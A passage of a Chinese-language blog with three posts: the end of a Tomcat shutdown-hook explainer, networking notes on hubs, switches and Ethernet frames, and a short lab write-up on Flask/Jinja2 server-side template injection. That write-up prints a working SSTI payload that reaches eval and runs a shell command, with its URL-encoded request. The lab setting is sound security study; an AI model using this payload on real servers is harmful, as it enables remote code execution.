class="type">LifecycleState</span> <span class="variable">state</span> <span class="operator">=</span> s.getState();</span><br><span class="line">        <span class="keyword">if</span> (LifecycleState.STOPPING_PREP.compareTo(state) &lt;= <span class="number">0</span></span><br><span class="line">                &amp;&amp; LifecycleState.DESTROYED.compareTo(state) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// Nothing to do. stop() was already called</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            s.stop();</span><br><span class="line">            s.destroy();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (LifecycleException e) &#123;</span><br><span class="line">        log.error(sm.getString(<span class="string">&quot;catalina.stopError&quot;</span>), e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Catalina 的 stop 方法主要逻辑是调用 Server 对象的 stop 方法。</p>
<h2 id="聊聊关闭钩子"><a href="#聊聊关闭钩子" class="headerlink" title="# 聊聊关闭钩子"></a><a href="#%E8%81%8A%E8%81%8A%E5%85%B3%E9%97%AD%E9%92%A9%E5%AD%90">#</a> 聊聊关闭钩子</h2><p>上面我们看到CatalinaShutdownHook, 这里有必要谈谈JVM的关闭钩子。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (shutdownHook == <span class="literal">null</span>) &#123;</span><br><span class="line">    shutdownHook = <span class="keyword">new</span> <span class="title class_">CatalinaShutdownHook</span>();</span><br><span class="line">&#125;</span><br><span class="line">Runtime.getRuntime().addShutdownHook(shutdownHook);</span><br></pre></td></tr></table></figure>

<p>关闭钩子是指通过<strong>Runtime.addShutdownHook注册的但尚未开始的线程</strong>。这些钩子可以用于<strong>实现服务或者应用程序的清理工作</strong>，例如删除临时文件，或者清除无法由操作系统自动清除的资源。</p>
<p>JVM既可以正常关闭，也可以强行关闭。正常关闭的触发方式有多种，包括：当最后一个“正常（非守护）”线程结束时，或者当调用了System.exit时，或者通过其他特定于平台的方法关闭时（例如发送了SIGINT信号或者键入Ctrl-C）。</p>
<p>在<strong>正常关闭中，JVM首先调用所有已注册的关闭钩子</strong>。JVM并不能保证关闭钩子的调用顺序。在关闭应用程序线程时，如果有（守护或者非守护）线程仍然在执行，那么这些线程接下来将与关闭进程并发执行。当所有的关闭钩子都执行结束时，如果runFinalizersOnExit为true【通过Runtime.runFinalizersOnExit(true)设置】，那么JVM将运行这些Finalizer（对象重写的finalize方法），然后再停止。JVM不会停止或中断任何在关闭时仍然运行的应用程序线程。当JVM最终结束时，这些线程将被强行结束。如果关闭钩子或者Finalizer没有执行完成，那么正常关闭进程“挂起”并且JVM必须被强行关闭。当<strong>JVM被强行关闭时，只是关闭JVM，并不会运行关闭钩子</strong>（举个例子，类似于电源都直接拔了，还怎么做其它动作呢？）。</p>
<p>下面是一个简单的示例：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">T</span> &#123;</span><br><span class="line">	<span class="meta">@SuppressWarnings(&quot;deprecation&quot;)</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">		<span class="comment">//启用退出JVM时执行Finalizer</span></span><br><span class="line">		Runtime.runFinalizersOnExit(<span class="literal">true</span>);</span><br><span class="line">		<span class="type">MyHook</span> <span class="variable">hook1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyHook</span>(<span class="string">&quot;Hook1&quot;</span>);</span><br><span class="line">		<span class="type">MyHook</span> <span class="variable">hook2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyHook</span>(<span class="string">&quot;Hook2&quot;</span>);</span><br><span class="line">		<span class="type">MyHook</span> <span class="variable">hook3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyHook</span>(<span class="string">&quot;Hook3&quot;</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="comment">//注册关闭钩子</span></span><br><span class="line">		Runtime.getRuntime().addShutdownHook(hook1);</span><br><span class="line">		Runtime.getRuntime().addShutdownHook(hook2);</span><br><span class="line">		Runtime.getRuntime().addShutdownHook(hook3);</span><br><span class="line">		</span><br><span class="line">		<span class="comment">//移除关闭钩子</span></span><br><span class="line">		Runtime.getRuntime().removeShutdownHook(hook3);</span><br><span class="line">		</span><br><span class="line">		<span class="comment">//Main线程将在执行这句之后退出</span></span><br><span class="line">		System.out.println(<span class="string">&quot;Main Thread Ends.&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyHook</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line">	<span class="keyword">private</span> String name;</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">MyHook</span> <span class="params">(String name)</span> &#123;</span><br><span class="line">		<span class="built_in">this</span>.name = name;</span><br><span class="line">		setName(name);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">		System.out.println(name + <span class="string">&quot; Ends.&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//重写Finalizer，将在关闭钩子后调用</span></span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">finalize</span><span class="params">()</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">		System.out.println(name + <span class="string">&quot; Finalize.&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>和（可能的）执行结果（因为JVM不保证关闭钩子的调用顺序，因此结果中的第二、三行可能出现相反的顺序）：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Main Thread Ends.</span><br><span class="line">Hook2 Ends.</span><br><span class="line">Hook1 Ends.</span><br><span class="line">Hook3 Finalize.</span><br><span class="line">Hook2 Finalize.</span><br><span class="line">Hook1 Finalize.</span><br></pre></td></tr></table></figure>

<p>可以看到，main函数执行完成，首先输出的是Main Thread Ends，接下来执行关闭钩子，输出Hook2 Ends和Hook1 Ends。这两行也可以证实：JVM确实不是以注册的顺序来调用关闭钩子的。而由于hook3在调用了addShutdownHook后，接着对其调用了removeShutdownHook将其移除，于是hook3在JVM退出时没有执行，因此没有输出Hook3 Ends。</p>
<p>另外，由于MyHook类实现了finalize方法，而main函数中第一行又通过Runtime.runFinalizersOnExit(true)打开了退出JVM时执行Finalizer的开关，于是3个hook对象的finalize方法被调用，输出了3行Finalize。</p>
<p>注意，多次调用addShutdownHook来注册同一个关闭钩子将会抛出IllegalArgumentException:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Exception <span class="keyword">in</span> thread <span class="string">&quot;main&quot;</span> java.lang.IllegalArgumentException: Hook previously registered</span><br><span class="line">	at java.lang.ApplicationShutdownHooks.add(ApplicationShutdownHooks.java:72)</span><br><span class="line">	at java.lang.Runtime.addShutdownHook(Runtime.java:211)</span><br><span class="line">	at T.main(T.java:12)</span><br></pre></td></tr></table></figure>

<p>另外，从JavaDoc中得知：<strong>一旦JVM关闭流程开始，就只能通过调用halt方法来停止该流程，也不可能再注册或移除关闭钩子了，这些操作将导致抛出IllegalStateException</strong>。</p>
<p>如果在关闭钩子中关闭应用程序的公共的组件，如日志服务，或者数据库连接等，像下面这样：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().addShutdownHook(<span class="keyword">new</span> <span class="title class_">Thread</span>() &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="keyword">try</span> &#123; </span><br><span class="line">			LogService.<span class="built_in">this</span>.stop();</span><br><span class="line">		&#125; <span class="keyword">catch</span> (InterruptedException ignored)&#123;</span><br><span class="line">			<span class="comment">//ignored</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>由于<strong>关闭钩子将并发执行，因此在关闭日志时可能导致其他需要日志服务的关闭钩子产生问题</strong>。<strong>为了避免这种情况，可以使关闭钩子不依赖那些可能被应用程序或其他关闭钩子关闭的服务</strong>。实现这种功能的一种方式是对所有服务使用同一个关闭钩子（而不是每个服务使用一个不同的关闭钩子），并且在该关闭钩子中执行一系列的关闭操作。这确保了关闭操作在单个线程中串行执行，从而避免了在关闭操作之前出现竞态条件或死锁等问题。</p>
<h3 id="使用场景"><a href="#使用场景" class="headerlink" title="# 使用场景"></a><a href="#%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF">#</a> 使用场景</h3><p>通过Hook实现临时文件清理</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          Thread.sleep(<span class="number">20000</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">          e.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      Runtime.getRuntime().addShutdownHook(<span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">          <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">              System.out.println(<span class="string">&quot;auto clean temporary file&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="小结"><a href="#小结" class="headerlink" title="# 小结"></a><a href="#%E5%B0%8F%E7%BB%93">#</a> 小结</h2><p>Catalina 类承接了 Bootstrap 类的 load 和 start 方法，然后根据配置初始化了 Tomcat 的组件，并调用了 Server 类的 init 和 start 方法来启动 Tomcat。</p>
<h2 id="参考文章-1"><a href="#参考文章-1" class="headerlink" title="# 参考文章"></a><a href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0">#</a> 参考文章</h2><ul>
<li><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000022012525">https://segmentfault.com/a/1190000022012525</a></li>
<li><a target="_blank" rel="noopener" href="https://my.oschina.net/itblog/blog/811053">https://my.oschina.net/itblog/blog/811053</a></li>
</ul>
<hr>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://qwq0qwq.github.io/2023/08/09/Flask%EF%BC%88Jinja2%EF%BC%89-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="QWQ0QWQ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="QWQ0QWQ's blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | QWQ0QWQ's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2023/08/09/Flask%EF%BC%88Jinja2%EF%BC%89-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">Flask（Jinja2） 服务端模板注入漏洞</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2023-08-09 20:53:08" itemprop="dateCreated datePublished" datetime="2023-08-09T20:53:08+08:00">2023-08-09</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2023-08-11 07:45:07" itemprop="dateModified" datetime="2023-08-11T07:45:07+08:00">2023-08-11</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="Flask（Jinja2）-服务端模板注入漏洞"><a href="#Flask（Jinja2）-服务端模板注入漏洞" class="headerlink" title="Flask（Jinja2） 服务端模板注入漏洞"></a>Flask（Jinja2） 服务端模板注入漏洞</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>参考文章：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf">https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf</a></li>
<li><a target="_blank" rel="noopener" href="http://rickgray.me/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates">http://rickgray.me/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates</a></li>
</ul>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>编译及运行测试环境：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker compose build</span><br><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>



<h4 id="安装Arjun"><a href="#安装Arjun" class="headerlink" title="安装Arjun"></a>安装Arjun</h4><p>git clone <a target="_blank" rel="noopener" href="https://github.com/s0md3v/Arjun.git">https://github.com/s0md3v/Arjun.git</a> </p>
<p>cd Arjun </p>
<p>python3 setup.py install</p>
<p>访问<code>http://your-ip:8000/?name=&#123;&#123;233*233&#125;&#125;</code>，得到54289，说明SSTI漏洞存在。</p>
<p>获取eval函数并执行任意python代码的POC：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &#x27;eval&#x27; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>访问<code>http://your-ip:8000/?name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D</code>，得到执行结果：</p>
<p><img src="https://vulhub.org/vulhub/flask/ssti/1.png" alt="img"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://qwq0qwq.github.io/2023/08/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="QWQ0QWQ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="QWQ0QWQ's blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | QWQ0QWQ's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2023/08/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" class="post-title-link" itemprop="url">计算机网络</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2023-08-09 20:52:29" itemprop="dateCreated datePublished" datetime="2023-08-09T20:52:29+08:00">2023-08-09</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2023-11-16 16:45:41" itemprop="dateModified" datetime="2023-11-16T16:45:41+08:00">2023-11-16</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="计算机网络"><a href="#计算机网络" class="headerlink" title="计算机网络"></a>计算机网络</h1><p>计算机网络的主要作用就是实现计算机之间的通信，这是主要的作用。</p>
<p><img src="https://pic1.zhimg.com/80/v2-2d62ba265be486cb94ab531912aa3b9c_720w.webp" alt="img"></p>
<h2 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h2><h4 id="物理层主要功能：为数据端设备提供传送数据通路、传输数据。"><a href="#物理层主要功能：为数据端设备提供传送数据通路、传输数据。" class="headerlink" title="物理层主要功能：为数据端设备提供传送数据通路、传输数据。"></a>物理层主要功能：为数据端设备提供传送数据通路、传输数据。</h4><p><img src="https://pic1.zhimg.com/v2-343093645638ea0839b71db5eba1f7c0_r.jpg" alt="img"></p>
<p>假设现在有两台计算机，我们需要实现这两台计算机之间的通信，最简单的方式是用一根线将他们连起来，使用高低电平来进行通信，但如果计算机的数量提升到五台，这时候就需要五台计算机之间两两连线才能通过这种方法进行计算机的通信。这种情况下，需要的线的数量就会有大幅提升，这时，就提出两个重要的思想：1.转发，2.标识。这时候通过一个设备来统一进行转发。这种设备叫做hub（集线器），假设这五台计算机分别为A,B,C,D,E,集线器为F.这时，A,B,C,D,E全部接入F,网络拓扑图大概如下：</p>
<p><img src="/.io//Users\HSR\AppData\Roaming\Typora\typora-user-images\image-20230808150259463.png" alt="image-20230808150259463"></p>
<p>当A向C通信时，A先将需要发送的数据发往F，F做一个无条件的转发，将数据发往B，C，D，E，当B接收到这个数据之后，发现不是发送给B的，就将其丢弃，当C接收到数据，发现是发送给C的，就接收数据。这种方式就是消息洪泛。这种设计有一个问题，就是当A在发送的同时，E也在发送，但集线器只能处理电信号，集线器没法分辩这两个电信号，所以他在转发的时候就会将其杂糅在一起，发送给其他设备，这就导致其他设备接收到的数据是混合起来的，数据就无法解析。针对这一问题就提出了一种协议，叫做CSMA&#x2F;CD，CSMA&#x2F;CD实现一种载波监听的功能，通过载波监听的方式，在发送数据的时候，先检测链路上有没有其他设备在发送数据，如果没有的话，再进行发送，这就是载波监听的主要的一个功能，能够防止冲突。这种方法有什么问题呢，首先，进行数据广播，带宽利用率比较低，其次，所有链路上同时只能有一个设备进行发送数据，导致链路的利用率很低，如果当设备数量较大时比如1k台设备，发送数据的时间间隔就会特别大。所有这种方式只适用于很小很小的范围内，比如只有几台设备的网络里。</p>
<h2 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h2><p><img src="https://pic1.zhimg.com/80/v2-fb8534d86e40986e43449de6c35ebd14_720w.webp" alt="img"></p>
<p>针对上面的问题，提出了第二章设备，交换机（switch），交换机主要作用也是起到一个转发的作用，而集线器最大的问题是没有记录设备的标识符，它只是将数据广播出去,由设备进行判断处理，这样导致传输效率特别低，并且不安全。交换机中记录了地址与物理端口的映射方式。记录的地址是mac地址（物理地址），这个地址是全球唯一的，但是是可以改的。交换机中存在一张表，记录了每个mac地址和对应的端口。交换机的通信是全双工的，集线器用的线大多是双绞线，双绞线在工作的时候是只能有一台设备进行发送数据的。交换机现在用的就是网线了，网线里面一般有八根线，正常情况下至少有4根线在进行工作，这导致在发送数据的同时也能接收数据。当一台全新的交换机设备接入网络中时，假设计算机分别为A,B,C，交换机为F、网络拓扑图如下</p>
<p><img src="/.io//Users\HSR\AppData\Roaming\Typora\typora-user-images\image-20230808155532291.png" alt="image-20230808155532291"></p>
<p>此时还未进行任何通信，记录mac地址与端口的表为空，当A向B发送数据时，过程如下：A将数据发送到交换机，交换机收到数据，记录下A的mac地址和端口，只是交换机中找不到B，就将数据从所有端口发出，当B做出回应，交换机就记录了B的mac地址和端口。</p>
<p>进过多次通信，所有设备都能够记录mac地址与端口的映射。</p>
<p>交换机是可以和交换机连接的。以下面网络拓扑图为例</p>
<p><img src="/.io//Users\HSR\AppData\Roaming\Typora\typora-user-images\image-20230808160526631.png" alt="image-20230808160526631"></p>
<p>记录过程其实与单台交换机一样，当A向E发送数据时，A在F中找不到E，就向所有端口发送数据，G接收到数据，就将其发给E，E做出回应，F就记录E的mac地址和对应的物理端口，而实际的物理端口是接入了另一台交换机的，假设端口为端口四，记录表中记录类似于{macE：端口四}{macD：端口四}，端口号可以重复。这种设计存在一些问题：一个表大概能够存储几千个。而且多连接交换机会存在如果第一个交换机没有记录，就会在进行广播，如果再没有就在下一个交换机进行广播，直到找到目标，就导致一个消息的洪泛，效率比较低，适用于一个比较小的网络，几千台设备的网络。数据链路层会在 frame 尾端置放检查码（parity，sum，CRC）以检查实质内容，将物理层提供的可能出错的物理连接改造成逻辑上无差错的数据链路，并对物理层的原始数据进行数据封装。从数据链路层开始对数据进行封装。</p>
<h3 id="数据链路层协议"><a href="#数据链路层协议" class="headerlink" title="数据链路层协议"></a>数据链路层协议</h3><p>首先Ethernet、IEEE802.3、PPP和HDLC都是数据链路层的协议，只不过后面三个不常用而已，数据链路层最常用的协议是Etnernet以太网协议。</p>
<p>Ethernet和IEEE802.3属于以太链路层协议</p>
<p> 广域网中经常会使用串行链路来提供远距离的数据传输，高级数据链路控制HDLC（High-Level Data Link Control）和点对点协议PPP（ Point to Point Protocol）是两种典型的串口封装协议。</p>
<p><img src="https://img-blog.csdnimg.cn/20181119081551203.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70" alt="img"></p>
<h4 id="Ethernet以太网协议"><a href="#Ethernet以太网协议" class="headerlink" title="Ethernet以太网协议"></a>Ethernet以太网协议</h4><p>Ethernet以太网协议，用于实现链路层的数据传输和地址封装</p>
<h5 id="以太网数据帧的封装"><a href="#以太网数据帧的封装" class="headerlink" title="以太网数据帧的封装"></a>以太网数据帧的封装</h5><p><img src="https://img-blog.csdnimg.cn/20181119082105147.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70" alt="img"></p>
<p><img src="https://img-blog.csdnimg.cn/20181119081902313.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70" alt="img"></p>
<p>从上图可以看到 Ethernet II帧，目的地址、源地址字段各占6个字节，目的地址字段确定帧的接收者，源地址字段标识帧发送者。<br>当使用六个字节的源地址字段时，前三个字节表示由IEEE分配给厂商的地址，将烧录在每一块网络接口卡的ROM中。而制造商通<br>常为其每一网络接口卡分配后字节。其实目的、源地址就是我们经常说的MAC地址，比如00:1A:A0:31:39:D4就是一个MAC地址。<br>类型字段，为2字节，用来标识上一层所使用的协议类型，如IP协议（0x0800）,ARP(0x0806)等。<br>数据字段 以太网包最小规定为64字节，不足的也会填充到64字节。以太网包的最大长度是1518字节，数据字段长度范围为46到1500，<br>这是为什么呢？因为以太网包最小规定为64字节，不足的也会填充到64字节。而以太网帧格式的其他部分加起来是6+6+2+4&#x3D;18字节，<br>所以数据部分的最小长度为64-18&#x3D;46字节；而以太网包的最大长度是1518字节，因此1518-18&#x3D;1500字节。<br>FCS字段是帧校验字段，即Frame Check Sequence，用来保存CRC(循环冗余校验)校验值。</p>
<h3 id="IEEE802-3协议"><a href="#IEEE802-3协议" class="headerlink" title="IEEE802.3协议"></a>IEEE802.3协议</h3><p>IEEE 802.3 通常指以太网，一种网络协议。描述物理层和数据链路层的MAC子层的实现方法，在多种物理媒体上以多种速率采用CSMA&#x2F;CD访问方式<br>MAC（MediaAccessControl）媒体访问控制层，该层定义了数据包怎样在介质上进行传输。<br>LLC （LogicalLinks Control）逻辑链路控制层</p>
<p><img src="https://img-blog.csdnimg.cn/20181119082208691.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70" alt="img"></p>
<h3 id="PPP协议"><a href="#PPP协议" class="headerlink" title="PPP协议"></a>PPP协议</h3><p>PPP协议是一种点到点(一根链路两端只有两个接口)链路层协议，主要用于在全双工的同异步链路上进行点到点的数据传输。</p>
<p><img src="https://img-blog.csdnimg.cn/20181119082414640.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70" alt="img"></p>
<p>LCP是用来创建二层连接的，是有连接的(以太协议无连接)；NCP是用来实现三层通信的</p>
<p><img src="https://img-blog.csdnimg.cn/20181119082445880.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70" alt="img"><img src="https://img-blog.csdnimg.cn/20181119082456421.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70" alt="img"></p>
